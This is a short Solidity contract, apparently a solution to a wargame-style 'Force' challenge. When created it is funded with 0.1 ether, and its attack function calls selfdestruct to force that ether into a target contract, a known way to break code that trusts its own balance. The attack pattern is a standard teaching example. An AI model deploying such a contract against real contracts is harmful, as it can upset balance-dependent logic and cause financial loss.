// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

contract ForceAttacker {
    address target;

    constructor(address _target) payable {
        require(msg.value == 0.1 ether);
        target = _target;
    }

    function attack() public {
        selfdestruct(payable(target));
    }
}